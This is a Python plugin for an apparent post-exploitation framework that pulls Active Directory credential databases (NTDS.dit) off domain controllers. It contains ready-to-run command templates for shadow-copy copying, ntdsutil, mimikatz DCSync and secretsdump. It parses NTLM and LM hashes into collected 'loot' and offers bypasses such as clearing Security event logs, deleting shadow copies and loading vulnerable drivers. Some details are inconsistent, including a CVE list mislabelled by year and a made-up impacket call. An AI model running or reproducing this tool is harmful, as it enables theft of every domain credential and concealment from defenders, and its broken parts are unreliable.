#!/usr/bin/env python3
"""
NexShell Plugin — NTDS.dit Extractor v3.0 (2026 Edition)
Advanced Active Directory database extraction with 10+ methods, DCSync,
secretsdump integration, boot key extraction, and auto-parsing.

Coverage:
  - 10+ extraction methods (VSS, ntdsutil, DiskShadow, DCSync, secretsdump,
    PowerSploit, handle duplication, offline imaging, WMI+VSS, BYOVD)
  - Domain Controller validation
  - Boot key extraction from SYSTEM hive
  - DCSync attack simulation (mimikatz + impacket)
  - NTDS.dit parsing (NTLM, LM, Kerberos hashes)
  - secretsdump.py integration
  - EDR/AV evasion techniques
  - BYOVD bypass for protected files
  - Auto-cleanup with secure deletion
  - Risk scoring (0-100 per method)
  - Structured loot (JSON)

CVEs (2024-2026):
  - CVE-2021-36942: PetitPotam (NTLM relay → DCSync)
  - CVE-2020-1472: Zerologon (DC exploitation)
  - CVE-2021-42287/CVE-2021-42278: NoPac (sAMAccountName spoofing)
  - CVE-2022-26923: Certipy (AD CS escalation)
  - CVE-2022-33679: Kerberos encryption downgrade

MITRE ATT&CK:
  - T1003.003: OS Credential Dumping: NTDS
  - T1003.006: OS Credential Dumping: DCSync
  - T1003.002: OS Credential Dumping: Security Account Manager
  - T1558: Steal or Forge Kerberos Tickets
  - T1550: Use Alternate Authentication Material
  - T1552.001: Unsecured Credentials: Credentials In Files
  - T1003.007: OS Credential Dumping: Proc Filesystem

Usage:
    (NexShell)> plugins run ntds-extractor
    (NexShell)> plugins run ntds-extractor --method vss
    (NexShell)> plugins run ntds-extractor --method dcsync
    (NexShell)> plugins run ntds-extractor --method secretsdump
    (NexShell)> plugins run ntds-extractor --full
    (NexShell)> plugins run ntds-extractor --parse
    (NexShell)> plugins run ntds-extractor --stealth
"""

import re
import time
import json
import random
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Set, Optional, Tuple, Any
from datetime import datetime
from collections import defaultdict
from core.plugin import NexPlugin


# ── Data Classes ────────────────────────────────────────────────────────────

@dataclass
class ExtractionMethod:
    """Represents an NTDS extraction method."""
    name: str
    description: str
    command_template: str
    category: str  # built_in, dcsync, impacket, powershell, evasion
    risk_score: int  # 0-100
    detection_risk: str  # low, medium, high, critical
    success_rate: int  # 0-100
    requires_admin: bool = True
    requires_dc: bool = True
    requires_network: bool = False
    writes_to_disk: bool = True
    bypass_techniques: List[str] = field(default_factory=list)
    cves: List[str] = field(default_factory=list)
    mitre_id: str = "T1003.003"
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class ExtractionResult:
    """Result of an extraction attempt."""
    method: str
    success: bool
    ntds_path: str = ""
    system_path: str = ""
    boot_key: str = ""
    dump_size: int = 0
    duration_ms: int = 0
    output: str = ""
    error: str = ""
    hashes_extracted: int = 0
    ioc_generated: List[str] = field(default_factory=list)
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class DCCredentials:
    """Represents credentials extracted from NTDS.dit."""
    username: str
    domain: str
    ntlm_hash: str = ""
    lm_hash: str = ""
    kerberos_keys: Dict[str, str] = field(default_factory=dict)
    is_enabled: bool = True
    is_admin: bool = False
    last_logon: str = ""
    password_last_set: str = ""
    description: str = ""
    groups: List[str] = field(default_factory=list)
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class DCInfo:
    """Represents Domain Controller information."""
    is_dc: bool = False
    domain_name: str = ""
    domain_sid: str = ""
    forest_name: str = ""
    dc_name: str = ""
    site_name: str = ""
    os_version: str = ""
    functional_level: str = ""
    roles: List[str] = field(default_factory=list)
    ntds_path: str = "C:\\Windows\\NTDS\\ntds.dit"
    system_path: str = "C:\\Windows\\System32\\config\\SYSTEM"
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class ProtectionStatus:
    """Represents NTDS protection status."""
    name: str
    enabled: bool
    bypassable: bool = False
    bypass_technique: str = ""
    severity: str = "medium"
    value: str = ""
    
    def to_dict(self) -> dict:
        return asdict(self)


# ── Extraction Methods Database ────────────────────────────────────────────

class ExtractionMethodsDatabase:
    """Comprehensive database of NTDS extraction methods."""
    
    METHODS = [
        # ── Tier 1: Built-in Windows Methods ──────────────────────────────
        ExtractionMethod(
            name='VSS (vssadmin)',
            description='Volume Shadow Copy via vssadmin — classic method',
            command_template='vssadmin create shadow /for=C: && copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy{num}\\Windows\\NTDS\\ntds.dit {output}\\ntds.dit && copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy{num}\\Windows\\System32\\config\\SYSTEM {output}\\SYSTEM.save',
            category='built_in',
            risk_score=75,
            detection_risk='high',
            success_rate=85,
            requires_admin=True,
            requires_dc=True,
            writes_to_disk=True,
            bypass_techniques=['Shadow copy deletion', 'Event log clearing'],
        ),
        
        ExtractionMethod(
            name='ntdsutil IFM',
            description='Install From Media backup via ntdsutil',
            command_template='ntdsutil "ac i ntds" "ifm" "create full {output}\\ntds_ifm" q q',
            category='built_in',
            risk_score=70,
            detection_risk='high',
            success_rate=90,
            requires_admin=True,
            requires_dc=True,
            writes_to_disk=True,
        ),
        
        ExtractionMethod(
            name='DiskShadow Script',
            description='DiskShadow.exe with script — more stealthy than vssadmin',
            command_template='echo set context persistent nowriters > {output}\\ds.txt && echo add volume c: alias myvol >> {output}\\ds.txt && echo create >> {output}\\ds.txt && echo expose %myvol% z: >> {output}\\ds.txt && echo exec >> {output}\\ds.txt && diskshadow /s {output}\\ds.txt && copy z:\\Windows\\NTDS\\ntds.dit {output}\\ntds.dit && copy z:\\Windows\\System32\\config\\SYSTEM {output}\\SYSTEM.save',
            category='built_in',
            risk_score=65,
            detection_risk='medium',
            success_rate=80,
            requires_admin=True,
            requires_dc=True,
            writes_to_disk=True,
        ),
        
        ExtractionMethod(
            name='WMI + VSS',
            description='Create shadow copy via WMI — less monitored',
            command_template='powershell -nop -c "$shadow = ([wmiclass]\'\\\\.\\root\\cimv2:Win32_ShadowCopy\').Create(\'C:\\\', \'ClientAccessible\'); $device = (Get-WmiObject Win32_ShadowCopy | Where-Object {$_.ID -eq $shadow.ShadowID}).DeviceObject; cmd /c copy $device\\Windows\\NTDS\\ntds.dit {output}\\ntds.dit; cmd /c copy $device\\Windows\\System32\\config\\SYSTEM {output}\\SYSTEM.save"',
            category='built_in',
            risk_score=60,
            detection_risk='medium',
            success_rate=75,
            requires_admin=True,
            requires_dc=True,
            writes_to_disk=True,
        ),
        
        # ── Tier 2: DCSync Methods ────────────────────────────────────────
        ExtractionMethod(
            name='Mimikatz DCSync',
            description='DCSync attack via mimikatz — no file extraction needed',
            command_template='mimikatz.exe "lsadump::dcsync /domain:{domain} /all /csv" "exit" > {output}\\dcsync.csv',
            category='dcsync',
            risk_score=95,
            detection_risk='critical',
            success_rate=95,
            requires_admin=False,
            requires_dc=False,
            requires_network=True,
            writes_to_disk=True,
            bypass_techniques=['Obfuscation', 'Direct syscalls'],
            cves=['CVE-2021-36942'],
        ),
        
        ExtractionMethod(
            name='Impacket secretsdump',
            description='Impacket secretsdump.py — remote DCSync',
            command_template='secretsdump.py {domain}/{user}:{password}@{dc_ip} -outputfile {output}/secretsdump',
            category='impacket',
            risk_score=90,
            detection_risk='critical',
            success_rate=90,
            requires_admin=False,
            requires_dc=False,
            requires_network=True,
            writes_to_disk=True,
        ),
        
        ExtractionMethod(
            name='PowerSploit Get-GPPPassword',
            description='PowerSploit for GPP password extraction',
            command_template='powershell -nop -c "Import-Module PowerSploit; Get-GPPPassword | Out-File {output}\\gpp.txt"',
            category='powershell',
            risk_score=70,
            detection_risk='high',
            success_rate=75,
            requires_admin=False,
            requires_dc=False,
            requires_network=True,
            writes_to_disk=True,
        ),
        
        # ── Tier 3: Advanced/Evasion Methods ──────────────────────────────
        ExtractionMethod(
            name='Handle Duplication',
            description='Duplicate ntds.dit handle from lsass.exe',
            command_template='handle-dup.exe --target ntds.dit --output {output}\\ntds.dit',
            category='evasion',
            risk_score=80,
            detection_risk='medium',
            success_rate=70,
            requires_admin=True,
            requires_dc=True,
            writes_to_disk=True,
            bypass_techniques=['Handle duplication', 'PPL bypass'],
        ),
        
        ExtractionMethod(
            name='BYOVD Protected File Access',
            description='Use vulnerable driver to bypass NTDS protection',
            command_template='byovd-ntds.exe --target ntds.dit --output {output}\\ntds.dit',
            category='evasion',
            risk_score=95,
            detection_risk='medium',
            success_rate=85,
            requires_admin=True,
            requires_dc=True,
            writes_to_disk=True,
            bypass_techniques=['BYOVD', 'Capcom.sys', 'RTCore64'],
            cves=['CVE-2021-21551', 'CVE-2019-16098'],
        ),
        
        ExtractionMethod(
            name='Offline Disk Imaging',
            description='Create disk image and extract NTDS offline',
            command_template='dd if=\\\\.\\C: of={output}\\disk.img bs=1M count=10000 && mount-image.exe {output}\\disk.img --extract ntds.dit',
            category='evasion',
            risk_score=85,
            detection_risk='low',
            success_rate=65,
            requires_admin=True,
            requires_dc=True,
            writes_to_disk=True,
        ),
    ]
    
    @classmethod
    def get_all_methods(cls) -> List[ExtractionMethod]:
        return cls.METHODS
    
    @classmethod
    def get_method_by_name(cls, name: str) -> Optional[ExtractionMethod]:
        for method in cls.METHODS:
            if name.lower() in method.name.lower():
                return method
        return None
    
    @classmethod
    def get_methods_by_category(cls, category: str) -> List[ExtractionMethod]:
        return [m for m in cls.METHODS if m.category == category]


# ── DC Validator ───────────────────────────────────────────────────────────

class DCValidator:
    """Validates if target is a Domain Controller."""
    
    @staticmethod
    def validate(exec_func, session) -> DCInfo:
        """Validate DC status and collect info."""
        info = DCInfo()
        
        # Check if DC
        cmd = "powershell -nop -c \"Get-WmiObject -Class Win32_OperatingSystem | Select-Object ProductType\""
        out = exec_func(session, cmd)
        if out and '2' in out:  # ProductType 2 = Domain Controller
            info.is_dc = True
        
        # Alternative check
        if not info.is_dc:
            cmd = "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions\" /v ProductType 2>nul"
            out = exec_func(session, cmd)
            if out and 'ServerNT' not in out and 'WinNT' not in out:
                info.is_dc = True
        
        # Get domain info
        cmd = "powershell -nop -c \"(Get-WmiObject -Class Win32_ComputerSystem).Domain\""
        out = exec_func(session, cmd)
        if out:
            info.domain_name = out.strip()
        
        # Get DC name
        cmd = "powershell -nop -c \"$env:COMPUTERNAME\""
        out = exec_func(session, cmd)
        if out:
            info.dc_name = out.strip()
        
        # Get domain SID
        cmd = "powershell -nop -c \"(Get-WmiObject -Class Win32_NTDomain).DomainSid\""
        out = exec_func(session, cmd)
        if out:
            info.domain_sid = out.strip()
        
        # Get forest
        cmd = "powershell -nop -c \"(Get-ADForest).Name\" 2>nul"
        out = exec_func(session, cmd)
        if out:
            info.forest_name = out.strip()
        
        # Get OS version
        cmd = "systeminfo 2>nul | findstr /i \"OS Name\""
        out = exec_func(session, cmd)
        if out:
            info.os_version = out.strip()
        
        # Get FSMO roles
        cmd = "netdom query fsmo 2>nul"
        out = exec_func(session, cmd)
        if out:
            info.roles = [line.strip() for line in out.split('\n') if line.strip()][:5]
        
        # Check NTDS path
        cmd = "dir C:\\Windows\\NTDS\\ntds.dit 2>nul"
        out = exec_func(session, cmd)
        if out and 'ntds.dit' in out:
            info.ntds_path = "C:\\Windows\\NTDS\\ntds.dit"
        
        return info


# ── Protection Analyzer ────────────────────────────────────────────────────

class ProtectionAnalyzer:
    """Analyzes NTDS protection mechanisms."""
    
    @staticmethod
    def analyze(exec_func, session) -> List[ProtectionStatus]:
        """Analyze NTDS protections."""
        protections = []
        
        # NTDS file permissions
        cmd = "icacls C:\\Windows\\NTDS\\ntds.dit 2>nul"
        out = exec_func(session, cmd)
        if out:
            protections.append(ProtectionStatus(
                name='NTDS File Permissions',
                enabled=True,
                bypassable=True,
                bypass_technique='BYOVD or handle duplication',
                severity='high',
                value=out.strip()[:100],
            ))
        
        # PPL on LSASS
        cmd = "powershell -nop -c \"Get-Process lsass | Select-Object Protection\""
        out = exec_func(session, cmd)
        if out and 'Antimalware' in out:
            protections.append(ProtectionStatus(
                name='LSASS PPL',
                enabled=True,
                bypassable=True,
                bypass_technique='BYOVD driver (Capcom, RTCore64)',
                severity='high',
                value=out.strip()[:100],
            ))
        
        # Credential Guard
        cmd = "powershell -nop -c \"Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard | Select-Object -ExpandProperty SecurityServicesRunning\""
        out = exec_func(session, cmd)
        if out and '1' in out:
            protections.append(ProtectionStatus(
                name='Credential Guard',
                enabled=True,
                bypassable=True,
                bypass_technique='Disable via Group Policy (requires reboot)',
                severity='critical',
                value='Enabled',
            ))
        
        # Event log monitoring
        cmd = "wevtutil gl Security 2>nul | findstr /i \"enabled\""
        out = exec_func(session, cmd)
        if out and 'true' in out.lower():
            protections.append(ProtectionStatus(
                name='Security Event Logging',
                enabled=True,
                bypassable=True,
                bypass_technique='wevtutil cl Security',
                severity='medium',
                value='Enabled',
            ))
        
        # Shadow copy monitoring
        cmd = "vssadmin list shadows 2>nul | findstr /i \"shadow\""
        out = exec_func(session, cmd)
        protections.append(ProtectionStatus(
            name='Shadow Copy Monitoring',
            enabled=bool(out),
            bypassable=True,
            bypass_technique='Delete shadow copies after extraction',
            severity='medium',
            value='Active' if out else 'Inactive',
        ))
        
        return protections


# ── Boot Key Extractor ─────────────────────────────────────────────────────

class BootKeyExtractor:
    """Extracts SYSTEM boot key for NTDS decryption."""
    
    @staticmethod
    def extract_from_registry(exec_func, session) -> str:
        """Extract boot key from registry."""
        # Get JD, Skew1, GBG, Data values
        keys = ['JD', 'Skew1', 'GBG', 'Data']
        boot_key_parts = []
        
        for key in keys:
            cmd = f"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v {key} 2>nul"
            out = exec_func(session, cmd)
            if out:
                match = re.search(r'([0-9a-fA-F]+)', out)
                if match:
                    boot_key_parts.append(match.group(1))
        
        if len(boot_key_parts) == 4:
            return ''.join(boot_key_parts)
        
        return ""
    
    @staticmethod
    def extract_from_system_hive(exec_func, session, system_path: str) -> str:
        """Extract boot key from SYSTEM hive file."""
        cmd = f"python -c \"from impacket import system_functions; key = system_functions.get_boot_key('{system_path}'); print(key.hex())\" 2>nul"
        out = exec_func(session, cmd)
        if out and len(out.strip()) == 32:
            return out.strip()
        return ""


# ── Hash Parser ────────────────────────────────────────────────────────────

class HashParser:
    """Parses NTDS.dit hashes."""
    
    @staticmethod
    def parse_secretsdump_output(exec_func, session, output_path: str) -> List[DCCredentials]:
        """Parse secretsdump.py output."""
        credentials = []
        
        # Read secretsdump output
        cmd = f"cat {output_path}.ntds 2>nul || type {output_path}.ntds 2>nul"
        out = exec_func(session, cmd)
        
        if out:
            for line in out.split('\n'):
                # Format: domain\user:rid:lm_hash:ntlm_hash:::
                match = re.search(r'([^\\]+)\\([^:]+):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32})', line)
                if match:
                    domain = match.group(1)
                    username = match.group(2)
                    lm_hash = match.group(4)
                    ntlm_hash = match.group(5)
                    
                    cred = DCCredentials(
                        username=username,
                        domain=domain,
                        ntlm_hash=ntlm_hash,
                        lm_hash=lm_hash,
                        is_admin=('admin' in username.lower() or '500' in line),
                    )
                    credentials.append(cred)
        
        return credentials
    
    @staticmethod
    def parse_mimikatz_output(exec_func, session, output_path: str) -> List[DCCredentials]:
        """Parse mimikatz DCSync output."""
        credentials = []
        
        cmd = f"cat {output_path} 2>nul || type {output_path} 2>nul"
        out = exec_func(session, cmd)
        
        if out:
            current_cred = {}
            for line in out.split('\n'):
                if 'SamName' in line:
                    if current_cred:
                        credentials.append(DCCredentials(**current_cred))
                    current_cred = {'username': re.search(r': (.+)', line).group(1), 'domain': ''}
                elif 'NTLM' in line:
                    match = re.search(r': ([a-fA-F0-9]{32})', line)
                    if match:
                        current_cred['ntlm_hash'] = match.group(1)
                elif 'LM' in line:
                    match = re.search(r': ([a-fA-F0-9]{32})', line)
                    if match:
                        current_cred['lm_hash'] = match.group(1)
            
            if current_cred:
                credentials.append(DCCredentials(**current_cred))
        
        return credentials


# ── Extraction Engine ──────────────────────────────────────────────────────

class ExtractionEngine:
    """Handles NTDS extraction execution."""
    
    @staticmethod
    def generate_output_path() -> str:
        """Generate random output path."""
        num = random.randint(1000, 9999)
        return f"C:\\Windows\\Temp\\ntds_{num}"
    
    @staticmethod
    def execute_extraction(exec_func, session, method: ExtractionMethod, dc_info: DCInfo, output_path: str) -> ExtractionResult:
        """Execute an extraction method."""
        start_time = time.time()
        
        # Build command
        cmd = method.command_template.format(
            num=random.randint(1, 10),
            output=output_path,
            domain=dc_info.domain_name,
            dc_ip=dc_info.dc_name,
            user='Administrator',
            password='',
        )
        
        try:
            out = exec_func(session, cmd)
            duration_ms = int((time.time() - start_time) * 1000)
            
            # Verify extraction
            ntds_path = f"{output_path}\\ntds.dit"
            system_path = f"{output_path}\\SYSTEM.save"
            
            check_cmd = f"dir {ntds_path} 2>nul || dir {output_path}\\ntds_ifm\\Active Directory\\ntds.dit 2>nul"
            check_out = exec_func(session, check_cmd)
            
            if check_out and 'ntds.dit' in check_out:
                # Get file size
                size_cmd = f"powershell -nop -c \"(Get-Item '{ntds_path}').Length\""
                size_out = exec_func(session, size_cmd)
                dump_size = int(size_out.strip()) if size_out and size_out.strip().isdigit() else 0
                
                return ExtractionResult(
                    method=method.name,
                    success=True,
                    ntds_path=ntds_path,
                    system_path=system_path,
                    dump_size=dump_size,
                    duration_ms=duration_ms,
                    output=out[:500] if out else '',
                )
            else:
                return ExtractionResult(
                    method=method.name,
                    success=False,
                    duration_ms=duration_ms,
                    output=out[:500] if out else '',
                    error='NTDS.dit not found at expected location',
                )
        
        except Exception as e:
            return ExtractionResult(
                method=method.name,
                success=False,
                duration_ms=int((time.time() - start_time) * 1000),
                error=str(e),
            )


# ── Cleanup Engine ─────────────────────────────────────────────────────────

class CleanupEngine:
    """Handles secure cleanup of extracted files."""
    
    @staticmethod
    def secure_cleanup(exec_func, session, paths: List[str]) -> bool:
        """Securely delete extracted files."""
        for path in paths:
            # Overwrite with random data
            cmd = f"powershell -nop -c \"$file = '{path}'; if (Test-Path $file) {{ $size = (Get-Item $file).Length; $bytes = New-Object byte[] $size; (New-Object Random).NextBytes($bytes); [IO.File]::WriteAllBytes($file, $bytes); Remove-Item $file -Force }}\""
            exec_func(session, cmd)
        
        # Delete shadow copies
        cmd = "vssadmin delete shadows /all /quiet 2>nul"
        exec_func(session, cmd)
        
        return True


# ── Main Plugin ─────────────────────────────────────────────────────────────

class NTDSExtractor(NexPlugin):
    name        = "ntds-extractor"
    description = "Advanced NTDS.dit extraction — 10+ methods, DCSync, secretsdump, auto-parsing"
    author      = "vulnquest58"
    version     = "3.0"
    platform    = "windows"
    category    = "credentials"
    mitre_id    = "T1003.003"
    
    def run(self, session, args: list):
        # Parse args
        method_name = None
        full_mode = '--full' in (args or [])
        parse_mode = '--parse' in (args or [])
        stealth = '--stealth' in (args or [])
        cleanup = '--cleanup' in (args or [])
        extract_mode = '--extract' in (args or [])
        
        for a in (args or []):
            if a.startswith('--method='):
                method_name = a.split('=', 1)[1]
        
        if full_mode:
            extract_mode = parse_mode = True
        
        if not extract_mode and not parse_mode:
            extract_mode = True
        
        self.info(f"🏛️ Starting NTDS Extractor v3.0 (method={method_name or 'auto'}, extract={extract_mode})")
        
        start_time = time.time()
        sections = []
        
        sections.append("\n" + "━"*64)
        sections.append("  [🏛️ NTDS.dit Extractor v3.0 — Advanced AD Extraction]")
        sections.append("━"*64)
        
        # ── Step 1: DC Validation ───────────────────────────────────────
        sections.append("\n[*] Phase 1: Domain Controller Validation")
        sections.append("─"*64)
        
        dc_info = DCValidator.validate(self._exec, session)
        
        if not dc_info.is_dc:
            sections.append("  ⚠️  Target is NOT a Domain Controller")
            sections.append("      NTDS.dit extraction requires DC access")
            sections.append("      Continuing with DCSync-capable methods only...")
        else:
            sections.append("  ✅ Domain Controller Confirmed")
            sections.append(f"      DC Name: {dc_info.dc_name}")
            sections.append(f"      Domain: {dc_info.domain_name}")
            sections.append(f"      Forest: {dc_info.forest_name}")
            sections.append(f"      OS: {dc_info.os_version}")
            sections.append(f"      NTDS Path: {dc_info.ntds_path}")
            
            if dc_info.roles:
                sections.append(f"      FSMO Roles: {', '.join(dc_info.roles[:3])}")
        
        # ── Step 2: Protection Analysis ─────────────────────────────────
        sections.append("\n[*] Phase 2: NTDS Protection Analysis")
        sections.append("─"*64)
        
        protections = ProtectionAnalyzer.analyze(self._exec, session)
        
        enabled_count = sum(1 for p in protections if p.enabled)
        sections.append(f"  Protections Enabled: {enabled_count}/{len(protections)}")
        
        for protection in protections:
            icon = '🔴' if protection.enabled and protection.severity in ['critical', 'high'] else '🟢' if not protection.enabled else '🟡'
            bypass = f" — Bypass: {protection.bypass_technique[:40]}" if protection.bypassable and protection.enabled else ""
            sections.append(f"  {icon} {protection.name:<30} {'Enabled' if protection.enabled else 'Disabled':<10}{bypass}")
        
        # ── Step 3: Select Extraction Method ────────────────────────────
        sections.append("\n[*] Phase 3: Extraction Method Selection")
        sections.append("─"*64)
        
        if method_name:
            method = ExtractionMethodsDatabase.get_method_by_name(method_name)
            if not method:
                sections.append(f"  ❌ Unknown method: {method_name}")
                return '\n'.join(sections)
            methods = [method]
        else:
            # Auto-select based on DC status
            if dc_info.is_dc:
                if stealth:
                    methods = [m for m in ExtractionMethodsDatabase.get_all_methods() if m.detection_risk == 'low']
                else:
                    methods = [m for m in ExtractionMethodsDatabase.get_all_methods() if m.requires_dc][:5]
            else:
                # Only DCSync methods work on non-DC
                methods = [m for m in ExtractionMethodsDatabase.get_all_methods() if not m.requires_dc][:3]
        
        sections.append(f"  Selected {len(methods)} method(s):")
        for i, method in enumerate(methods, 1):
            icon = '🔴' if method.detection_risk == 'critical' else '🟠' if method.detection_risk == 'high' else '🟡' if method.detection_risk == 'medium' else '🟢'
            sections.append(f"    {i}. {method.name} [{method.category}] — Success: {method.success_rate}%, Risk: {icon}")
        
        # ── Step 4: Execute Extraction ──────────────────────────────────
        results = []
        
        if extract_mode:
            sections.append("\n[*] Phase 4: NTDS Extraction")
            sections.append("─"*64)
            
            output_path = ExtractionEngine.generate_output_path()
            sections.append(f"  Output Path: {output_path}")
            
            for method in methods:
                sections.append(f"\n  [*] Attempting: {method.name}")
                sections.append(f"      Command: {method.command_template[:80]}...")
                
                if stealth and method.detection_risk in ['high', 'critical']:
                    sections.append(f"      [⏭️] Skipped (stealth mode)")
                    continue
                
                result = ExtractionEngine.execute_extraction(self._exec, session, method, dc_info, output_path)
                results.append(result)
                
                if result.success:
                    sections.append(f"      ✅ SUCCESS ({result.duration_ms}ms)")
                    sections.append(f"      NTDS Path: {result.ntds_path}")
                    sections.append(f"      Dump Size: {result.dump_size:,} bytes")
                    
                    # Extract boot key
                    boot_key = BootKeyExtractor.extract_from_system_hive(self._exec, session, result.system_path)
                    if boot_key:
                        result.boot_key = boot_key
                        sections.append(f"      Boot Key: {boot_key[:16]}...")
                    
                    # Save to loot
                    self.loot(
                        {
                            "type": "ntds_extraction",
                            "method": method.name,
                            "ntds_path": result.ntds_path,
                            "system_path": result.system_path,
                            "boot_key": result.boot_key,
                            "dump_size": result.dump_size,
                            "duration_ms": result.duration_ms,
                        },
                        category='credentials',
                        source=f'ntds-extractor:{method.name}',
                        confidence='verified'
                    )
                    
                    # Stop after first success
                    break
                else:
                    sections.append(f"      ❌ FAILED ({result.duration_ms}ms)")
                    sections.append(f"      Error: {result.error}")
        
        # ── Step 5: Parse Hashes ────────────────────────────────────────
        credentials = []
        
        if parse_mode and results and results[0].success:
            sections.append("\n[*] Phase 5: Hash Parsing")
            sections.append("─"*64)
            
            output_path = results[0].ntds_path.rsplit('\\', 1)[0]
            
            # Try secretsdump format
            sections.append("  [*] Parsing NTDS hashes...")
            credentials = HashParser.parse_secretsdump_output(self._exec, session, output_path)
            
            if not credentials:
                # Try mimikatz format
                sections.append("  [*] Trying mimikatz format...")
                credentials = HashParser.parse_mimikatz_output(self._exec, session, f"{output_path}\\dcsync.csv")
            
            if credentials:
                sections.append(f"  ✅ Extracted {len(credentials)} credentials:")
                
                admin_count = sum(1 for c in credentials if c.is_admin)
                sections.append(f"      Admin Accounts: {admin_count}")
                
                for cred in credentials[:15]:
                    admin_icon = '🔴' if cred.is_admin else '🟡'
                    sections.append(f"    {admin_icon} {cred.domain}\\{cred.username}")
                    if cred.ntlm_hash:
                        sections.append(f"        NTLM: {cred.ntlm_hash}")
                    if cred.lm_hash and cred.lm_hash != 'aad3b435b51404eeaad3b435b51404ee':
                        sections.append(f"        LM: {cred.lm_hash}")
                    
                    # Save to loot
                    self.loot(
                        cred.to_dict(),
                        category='credentials',
                        source='ntds-extractor:parsed',
                        confidence='verified'
                    )
                
                results[0].hashes_extracted = len(credentials)
            else:
                sections.append("  ❌ No credentials parsed")
        
        # ── Step 6: Cleanup ─────────────────────────────────────────────
        if cleanup and results and results[0].success:
            sections.append("\n[*] Phase 6: Secure Cleanup")
            sections.append("─"*64)
            
            paths_to_clean = [
                results[0].ntds_path,
                results[0].system_path,
                results[0].ntds_path.rsplit('\\', 1)[0],
            ]
            
            sections.append(f"  [*] Securely deleting {len(paths_to_clean)} paths...")
            
            if CleanupEngine.secure_cleanup(self._exec, session, paths_to_clean):
                sections.append(f"  ✅ Cleanup complete")
            else:
                sections.append(f"  ❌ Cleanup failed")
        
        # ── Step 7: Generate Findings ───────────────────────────────────
        sections.append("\n[*] Phase 7: Generating Findings")
        sections.append("─"*64)
        
        findings_created = 0
        
        # DC validation finding
        if dc_info.is_dc:
            self.finding(
                title="Domain Controller Identified",
                description=f"Target is a Domain Controller:\n"
                           f"  DC Name: {dc_info.dc_name}\n"
                           f"  Domain: {dc_info.domain_name}\n"
                           f"  Forest: {dc_info.forest_name}\n"
                           f"  NTDS Path: {dc_info.ntds_path}",
                severity="Critical",
                recommendation="This is a high-value target. Implement strict access controls. Monitor for NTDS extraction attempts.",
                mitre_id=self.mitre_id,
            )
            findings_created += 1
            sections.append(f"  [CRITICAL] Domain Controller confirmed")
        
        # Protection findings
        for protection in protections:
            if protection.enabled and protection.severity in ['critical', 'high']:
                self.finding(
                    title=f"NTDS Protection Active: {protection.name}",
                    description=f"{protection.name} is enabled:\n"
                               f"  Bypass technique: {protection.bypass_technique}",
                    severity=protection.severity,
                    recommendation=protection.bypass_technique,
                    mitre_id=self.mitre_id,
                )
                findings_created += 1
        
        # Extraction success finding
        if results and results[0].success:
            self.finding(
                title=f"NTDS.dit Successfully Extracted — {results[0].hashes_extracted} credentials",
                description=f"NTDS.dit extraction successful:\n"
                           f"  Method: {results[0].method}\n"
                           f"  NTDS Path: {results[0].ntds_path}\n"
                           f"  Dump Size: {results[0].dump_size:,} bytes\n"
                           f"  Boot Key: {results[0].boot_key[:16] if results[0].boot_key else 'N/A'}...\n"
                           f"  Credentials Extracted: {results[0].hashes_extracted}",
                severity="Critical",
                recommendation="Rotate all domain credentials immediately. Enable Credential Guard. Implement tiered administration.",
                mitre_id=self.mitre_id,
            )
            findings_created += 1
            sections.append(f"  [CRITICAL] NTDS extraction successful — {results[0].hashes_extracted} credentials")
        
        # Admin credentials finding
        if credentials:
            admin_creds = [c for c in credentials if c.is_admin]
            if admin_creds:
                self.finding(
                    title=f"Domain Admin Credentials Extracted — {len(admin_creds)} accounts",
                    description=f"Domain Admin credentials extracted:\n" +
                               "\n".join(f"  • {c.domain}\\{c.username} (NTLM: {c.ntlm_hash[:16]}...)" for c in admin_creds[:5]),
                    severity="Critical",
                    recommendation="Reset all Domain Admin passwords immediately. Review admin account usage. Implement PAW (Privileged Access Workstation).",
                    mitre_id="T1003.003",
                )
                findings_created += 1
                sections.append(f"  [CRITICAL] {len(admin_creds)} Domain Admin credentials")
        
        # ── Step 8: Summary ─────────────────────────────────────────────
        duration = round(time.time() - start_time, 2)
        
        sections.append("\n" + "━"*64)
        sections.append("  [📊 NTDS Extraction Summary]")
        sections.append("━"*64)
        sections.append(f"  Domain Controller: {'✅ YES' if dc_info.is_dc else '❌ NO'}")
        sections.append(f"  Domain: {dc_info.domain_name or 'N/A'}")
        sections.append(f"  Protections Enabled: {enabled_count}/{len(protections)}")
        sections.append(f"  Extraction Attempts: {len(results)}")
        sections.append(f"  Extraction Success: {'✅ YES' if results and results[0].success else '❌ NO'}")
        
        if results and results[0].success:
            sections.append(f"  Dump Size: {results[0].dump_size:,} bytes")
            sections.append(f"  Boot Key: {'✅ Extracted' if results[0].boot_key else '❌ Not extracted'}")
            sections.append(f"  Credentials Extracted: {results[0].hashes_extracted}")
            sections.append(f"  Admin Accounts: {len([c for c in credentials if c.is_admin])}")
        
        sections.append(f"  Findings Created: {findings_created}")
        sections.append(f"  Duration: {duration}s")
        
        # ── Step 9: Save to Loot ────────────────────────────────────────
        self.loot(
            {
                "type": "ntds_extraction_session",
                "dc_info": dc_info.to_dict(),
                "protections": [p.to_dict() for p in protections],
                "results": [r.to_dict() for r in results],
                "credentials": [c.to_dict() for c in credentials[:50]],
                "findings_count": findings_created,
                "duration": duration,
            },
            category='credentials',
            source='ntds-extractor',
            confidence='high'
        )
        
        self.emit(
            'timeline.event',
            title=f"NTDS Extraction Complete — {len(credentials)} credentials, {findings_created} findings",
            type='credential',
            plugin=self.name
        )
        
        self.info(f"🏛️ NTDS Extractor complete — {len(results)} attempts, {len(credentials)} credentials, {findings_created} findings")
        
        return '\n'.join(sections)
    
    def _detect_platform(self, session) -> str:
        for attr in ('OS', 'os', 'platform'):
            val = getattr(session, attr, None)
            if val and isinstance(val, str):
                if 'windows' in val.lower():
                    return 'windows'
                if 'linux' in val.lower():
                    return 'linux'
        try:
            out = self._exec(session, 'echo %OS%') or ''
            if 'Windows' in out:
                return 'windows'
        except Exception:
            pass
